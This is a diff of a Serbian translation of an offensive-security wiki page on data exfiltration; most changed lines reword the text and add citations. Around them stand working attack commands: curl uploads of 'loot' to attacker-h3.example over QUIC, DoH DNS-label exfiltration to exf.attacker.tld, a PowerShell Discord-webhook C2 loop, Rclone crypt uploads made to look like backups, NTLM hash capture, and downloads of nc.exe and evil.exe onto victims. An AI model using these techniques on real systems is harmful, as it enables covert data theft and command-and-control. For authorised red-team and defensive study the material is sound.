@@ -1,19 +1,17 @@
-# Eksfiltracija
-
-{{#include ../banners/hacktricks-training.md}}
+# Exfiltration
 
 > [!TIP]
-> Za primer od početka do kraja koji prikazuje pripremu loot-a u `C:\Users\Public` i njegovu eksfiltraciju pomoću Rclone-a radi oponašanja legitimnih backup-a, pogledajte tok rada u nastavku.
+> Za end-to-end primer pripreme loot-a u `C:\Users\Public` i njegove exfiltracije pomoću Rclone-a radi oponašanja legitimnih backup-a, pogledajte workflow u nastavku.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Često whitelisted domeni za eksfiltraciju informacija
+## Često whitelisted domeni za exfiltraciju informacija
 
 Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često whitelisted domene koji se mogu zloupotrebiti
 
-## Kopiraj\&Nalepi Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -49,10 +47,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Otpremanje fajlova
+### Upload files
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer koji ispisuje GET i POST zahteve (takođe headere)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer ispisuje GET i POST zahteve (takođe headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Python modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -66,7 +64,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS server**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -109,7 +107,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ### HTTP/3 / QUIC
 
-Ako su izlazne kontrole podešene za inspekciju klasičnog **TCP/443**, ali su permisivne prema **UDP/443**, forsiranje **HTTP/3** može preusmeriti prenos na **QUIC** umesto na TLS-over-TCP. Krajnja tačka napadača mora imati nativnu podršku za HTTP/3 (na primer, reverse proxy ili upload endpoint koji već oglašava `Alt-Svc: h3`).
+Ako su izlazne kontrole podešene za inspekciju klasičnog **TCP/443**, ali su permisivne prema **UDP/443**, forsiranje **HTTP/3** može preusmeriti prenos na **QUIC** umesto na TLS-over-TCP. Endpoint napadača mora imati nativnu podršku za **HTTP/3** (na primer, reverse proxy ili upload endpoint koji već oglašava `Alt-Svc: h3`).
 ```bash
 # Strict: fail if QUIC/H3 is not available
 curl --http3-only -T loot.7z https://attacker-h3.example/upload
@@ -121,11 +119,11 @@ curl --http3 -T loot.7z https://attacker-h3.example/upload
 curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
 curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
 ```
-Istraživački rad iz 2025. godine (QUIC-Exfil) pokazao je da QUIC funkcije, kao što su šifrovana zaglavlja i migracija konekcije, mogu otežati detekciju eksfiltracije na nivou firewall-a u većoj meri nego klasični TLS ili kanali zasnovani na DNS-u, pa očekujte da ovaj prostor postane relevantniji sa širenjem HTTP/3 podrške.<sup>[[9]](#references)</sup>
+Istraživanje iz 2025. godine (QUIC-Exfil) pokazalo je da QUIC-ova šifrovana zaglavlja i dinamičke promene adresa mogu otežati detekciju exfiltration-a na nivou firewall-a u većoj meri nego kod kanala zasnovanih na TLS-u ili DNS-u, kao i demonstriralo metodu server-preferred-address koja prikriva exfiltration kao migraciju konekcije na strani servera.<sup>[[9]](#references)</sup>
 
-### Pre-signed / delegirani upload-i u object-storage
+### Pre-signed / delegirani object-storage upload-i
 
-Kada možete da kreirate ili dobijete kratkotrajni **signed URL**, žrtvi je potreban samo uobičajeni HTTPS klijent. Time se izbegava instaliranje cloud SDK-ova ili korišćenje dugotrajnih kredencijala na hostu i saobraćaj se uklapa u uobičajeni object-storage saobraćaj.
+Kada možete da kreirate ili pribavite kratkotrajni **signed URL**, žrtvi je potreban samo uobičajeni HTTPS klijent. Time se izbegava instaliranje cloud SDK-ova ili čuvanje dugotrajnih kredencijala na hostu.<sup>[[8]](#references)</sup> To se takođe može uklopiti u uobičajeni saobraćaj ka object-storage servisima.
 
 **Linux / macOS (AWS S3 pre-signed `PUT`)**
 ```bash
@@ -146,16 +144,15 @@ curl -X PUT --data-binary @loot.7z \
 -H 'Content-Type: application/octet-stream' \
 'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
 ```
-Napomene:
-- Pre-signed URLs / SAS tokens obično ograničavaju **path**, **HTTP method** i **expiration**.
-- Za Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` je obavezan.
-- Ovaj obrazac dobro funkcioniše sa `curl`, `Invoke-WebRequest` ili bilo kojim custom implantom koji može da pošalje sirovi HTTPS `PUT`.<sup>[[8]](#references)</sup>
+Beleške:
+- Pre-signed URLs / SAS tokens obično ograničavaju **putanju**, **HTTP method** i **expiration**.<sup>[[8]](#references)[[10]](#references)</sup>
+- Za Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` je obavezan.<sup>[[10]](#references)</sup>
+- Ovaj obrazac dobro funkcioniše sa `curl`, `Invoke-WebRequest` ili bilo kojim prilagođenim implantom koji može da pošalje sirovi HTTPS `PUT`.
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) je zamena u obliku jednog binarnog fajla za `python3 -m http.server`<sup>[[4]](#references)</sup>
-sa funkcijama za upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links
-i OOB collaboration funkcijama (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) je zamena u obliku jedne binarne datoteke za `python3 -m http.server`.<sup>[[4]](#references)</sup>
+Podržava upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links i OOB collaboration features (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
 ```bash
 # Serve current directory on port 8000
 goshs
@@ -184,13 +181,13 @@ goshs -smtp -smtp-domain [REDACTED]
 # Tunnel via localhost.run (no port forwarding needed)
 goshs -tunnel
 ```
-## Webhooks (Discord/Slack/Teams) za C2 i Data Exfiltration
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks su HTTPS endpoints koji dozvoljavaju samo upis i prihvataju JSON i opcione delove datoteka. Obično su dozvoljeni prema pouzdanim SaaS domenima i ne zahtevaju OAuth/API keys, što ih čini korisnim za beaconing i exfiltration uz malo trenja.<sup>[[5]](#references)[[6]](#references)</sup>
+Webhooks su HTTPS endpointi samo za upis koji prihvataju JSON i opcione delove datoteka. Obično su dozvoljeni trusted SaaS domenima i ne zahtevaju OAuth/API ključeve, što ih čini korisnim za beaconing i exfiltration uz malo prepreka.<sup>[[5]](#references)[[6]](#references)</sup>
 
 Ključne ideje:
 - Endpoint: Discord koristi https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data sa delom pod nazivom payload_json koji sadrži {"content":"..."} i opcionim delom/delovima datoteka pod nazivom file.
+- POST multipart/form-data sa delom pod nazivom payload_json koji sadrži {"content":"..."} i opcionim delom/delovima datoteke pod nazivom file.
 - Operator loop obrazac: periodični beacon -> directory recon -> ciljani file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK potvrđuju isporuku.
 
 PowerShell PoC (Discord):
@@ -261,21 +258,21 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-Napomene:
-- Slični obrasci važe i za druge collaboration platforms (Slack/Teams) koje koriste svoje incoming webhooks; prilagodite URL i JSON schema u skladu s tim.
-- Za DFIR Discord Desktop cache artifacts i oporavak webhook/API podataka pogledajte:<sup>[[7]](#references)</sup>
+Napomena:
+- Slični obrasci važe i za druge collaboration platforme (Slack/Teams) koje koriste svoje incoming webhooks; prilagodite URL i JSON schema u skladu s tim.
+- Za DFIR Discord Desktop cache artifacts i oporavak webhook/API podataka pogledajte povezanu stranicu u nastavku.<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
-## Rclone (cloud/object-storage egzfiltracija)
+## Rclone (cloud/object-storage exfiltration)
 
-Savremeni operatori često **lokalno pripreme loot**, a zatim koriste [Rclone](https://rclone.org/) kako bi transfer izgledao kao uobičajen backup ili sync job. Praktičan obrazac je:
+Moderni operateri često **lokalno pripreme loot**, a zatim koriste [Rclone](https://rclone.org/) kako bi transfer izgledao kao uobičajen backup ili sync job. Praktičan obrazac je:
 
 1. Uobičajeni remote (`s3`, `webdav`, `drive`, `mega`, ...)
-2. `crypt` wrapper, tako da su **sadržaj i nazivi datoteka enkriptovani na client-side-u**
-3. Opcioni `chunker` wrapper ako provider nameće ograničenja veličine objekata ili želite manje jedinice za upload
+2. `crypt` wrapper tako da su **sadržaj i imena datoteka šifrovani na klijentskoj strani**
+3. Opcioni `chunker` wrapper ako provider nameće ograničenja veličine objekata ili želite manje upload jedinice
 ```bash
 # 1) Create the storage backend remote (interactive)
 rclone config              # ex: remote
@@ -292,10 +289,10 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 # If you created the chunker wrapper, upload to overlay:... instead
 ```
 Napomene:
-- `crypt` može da šifruje i sadržaj datoteka i njihova imena.<sup>[[3]](#references)</sup>
-- `chunker` transparentno deli velike datoteke i ponovo ih sastavlja prilikom preuzimanja.
-- `rclone.conf` čuva `crypt` tajne u **zamaskiranom** obliku, što nije snažna zaštita podataka u mirovanju. Za kratkotrajne operacije koristite namensku privremenu konfiguraciju i uklonite je nakon toga. Ako morate da je zadržite duže, koristite šifrovano upravljanje konfiguracijom (`RCLONE_CONFIG_PASS` / `--password-command`) umesto ostavljanja običnog `rclone.conf` na disku.
-- Ako cilj već sinhronizuje **OneDrive**, **Google Drive** ili **Dropbox**, kopiranje loot-a u sinhronizovani direktorijum može iskoristiti već odobreni klijent umesto ubacivanja novog transfer binarnog fajla.
+- `crypt` može da enkriptuje i sadržaj fajlova i njihova imena.<sup>[[3]](#references)</sup>
+- `chunker` transparentno deli velike fajlove i ponovo ih sklapa prilikom preuzimanja.<sup>[[11]](#references)</sup>
+- `rclone.conf` čuva `crypt` secrets u **obscured** obliku, što ne predstavlja snažnu zaštitu podataka u mirovanju.<sup>[[3]](#references)</sup> Za kratkotrajne operacije, prednost dajte posebnom privremenom configu i uklonite ga nakon toga. Ako morate da ga zadržite duže, prednost dajte enkriptovanom rukovanju configom (`RCLONE_CONFIG_PASS` / `--password-command`), umesto da na disku ostavite običan `rclone.conf`.<sup>[[11]](#references)</sup>
+- Ako cilj već sinhronizuje **OneDrive**, **Google Drive** ili **Dropbox**, kopiranje loada u sinhronizovani direktorijum može iskoristiti već odobreni client umesto ubacivanja novog transfer binaryja.
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
@@ -351,7 +348,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ili kreirajte SMB share **koristeći Sambу**:
+Ili kreirajte smb share **pomoću Samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -375,8 +372,7 @@ WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.1
 WindPS-2> cd new_disk:
 ```
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) je alternativa u jednom binarnom fajlu<sup>[[4]](#references)</sup>
-koja deli fajlove putem SMB-a i prikuplja NetNTLMv2 hash-eve klijenata koji se povezuju:
+[goshs](https://github.com/patrickhener/goshs) je alternativa u jednom binarnom fajlu koja deli datoteke putem SMB-a i prikuplja NTLM hash-eve od klijenata koji se povezuju.<sup>[[4]](#references)</sup>
 ```bash
 # Start SMB server with NTLM hash capture
 goshs -smb -smb-domain CORP
@@ -386,7 +382,7 @@ goshs
 ```
 ## SCP
 
-Napadač mora imati pokrenut SSHd.
+Napadač mora da ima pokrenut SSHd.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
@@ -439,7 +435,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## DNS over HTTPS (DoH)
 
-Ako je klasični UDP/53 DNS bučan ili blokiran, ali je odlazni HTTPS uglavnom dozvoljen, uobičajeni DNS-label exfiltration obrazac može se upakovati unutar **DoH** zahteva ka javnom resolveru. Svaki label treba da bude znatno kraći od DNS ograničenja od 63 bajta i da koristi DNS-safe alfabet, kao što je Base32.
+Ako je klasični UDP/53 DNS bučan ili blokiran, ali je odlazni HTTPS uglavnom dozvoljen, uobičajeni obrazac exfiltration putem DNS labela može se umotati u **DoH** zahteve ka javnom resolveru. Svaki label treba da bude znatno kraći od DNS ograničenja od 63 bajta i treba koristiti DNS-safe alfabet, kao što je Base32.
 ```bash
 # Encode -> split into DNS-safe labels -> send via DoH
 base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
@@ -450,20 +446,19 @@ curl --http2 -s \
 >/dev/null
 done
 ```
-Na authoritative DNS serveru za `exf.attacker.tld`, sortirajte upite prema numeričkom prefiksu i rekonstrušite Base32 tok. Ovo zadržava transport unutar HTTPS-a do resolvera umesto klasičnog UDP/53 DNS-a.<sup>[[2]](#references)</sup>
+Na authoritative DNS serveru za `exf.attacker.tld`, sortirajte upite prema numeričkom prefiksu i rekonstrušite Base32 stream. Time se transport zadržava unutar HTTPS-a do resolvera umesto korišćenja klasičnog UDP/53 DNS-a.<sup>[[2]](#references)</sup>
 
-Za kompletne alate za dvosmerno DNS tunnelovanje (`iodine`, `dnscat2` itd.), pogledajte [stranicu o tunnelovanju](tunneling-and-port-forwarding.md).
+Za kompletne alate za bidirekcioni DNS tunnel (`iodine`, `dnscat2` itd.), pogledajte [stranicu o tunnelingu](tunneling-and-port-forwarding.md).
 
 ## **SMTP**
 
-Ako možete da šaljete podatke na SMTP server, možete kreirati SMTP server za prijem podataka pomoću python-a:
+Ako možete da šaljete podatke SMTP serveru, možete pomoću Pythona da kreirate SMTP server za njihov prijem:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) može brzo pokrenuti SMTP server<sup>[[4]](#references)</sup>
-za hvatanje email callbackova tokom OOB exfiltration scenarija:
+[goshs](https://github.com/patrickhener/goshs) može brzo da pokrene SMTP server za hvatanje email callback-ova tokom OOB exfiltration scenarija.<sup>[[4]](#references)</sup>
 ```bash
 # Start SMTP callback server
 goshs -smtp -smtp-domain [REDACTED]
@@ -476,7 +471,7 @@ goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
-Podrazumevano u XP i 2003 (u ostalima ga je potrebno eksplicitno dodati tokom instalacije)
+Podrazumevano u XP i 2003 (u drugim verzijama mora biti eksplicitno dodat tokom instalacije)
 
 U Kali-ju, **pokrenite TFTP server**:
 ```bash
@@ -485,18 +480,18 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP server u Pythonu:**
+**TFTP server u Python-u:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Na **victim** se povežite sa Kali serverom:
+Na **victim** se povežite na Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Preuzmite fajl pomoću PHP oneliner-a:
+Preuzmite datoteku pomoću PHP oneliner-a:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -538,7 +533,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne omogućava samo inspekciju binarnih datoteka već ima i **mogućnost da ih ponovo izgradi iz hex podataka**. To znači da, prosleđivanjem hex podataka binarne datoteke, `debug.exe` može da generiše binarnu datoteku. Međutim, važno je napomenuti da debug.exe ima **ograničenje sklapanja datoteka veličine do 64 kb**.<sup>[[1]](#references)</sup>
+Program `debug.exe` ne omogućava samo pregled binarnih datoteka, već ima i **mogućnost da ih ponovo izgradi iz heksadecimalnih vrednosti**. To znači da, prosleđivanjem heksadecimalnih vrednosti binarne datoteke, `debug.exe` može da generiše binarnu datoteku. Međutim, važno je napomenuti da debug.exe ima **ograničenje sklapanja datoteka veličine do 64 KB**.<sup>[[1]](#references)</sup>
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -546,16 +541,17 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 Zatim kopirajte i nalepite tekst u windows-shell i biće kreiran fajl pod nazivom nc.exe.
 
-## Reference
+## References
 
 - [1] [Prenos fajlova na Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 - [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
 - [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
 - [4] [goshs](https://github.com/patrickhener/goshs)
-- [5] [Discord kao C2 i keširani dokazi koji ostaju iza njega](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
-- [6] [Discord Webhooks – Izvršavanje Webhook-a](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [5] [Discord kao C2 i keširani tragovi koji ostaju iza njega](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [6] [Discord Webhooks – izvršavanje Webhook-a](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [7] [Discord Forensic Suite (parser keša)](https://github.com/jwdfir/discord_cache_parser)
-- [8] [Otpremanje objekata pomoću presigned URL-ova - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
-- [9] [QUIC-Exfil: Iskorišćavanje QUIC-ove funkcije Preferred Address servera za izvođenje napada eksfiltracije podataka](https://arxiv.org/abs/2505.05292)
-
+- [8] [Otpremanje objekata pomoću unapred potpisanih URL-ova - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+- [9] [QUIC-Exfil: iskorišćavanje funkcije Server Preferred Address u protokolu QUIC za izvođenje napada eksfiltracije podataka](https://arxiv.org/abs/2505.05292)
+- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
+- [11] [Rclone dokumentacija](https://rclone.org/docs/#configuration-encryption)
 {{#include ../banners/hacktricks-training.md}}
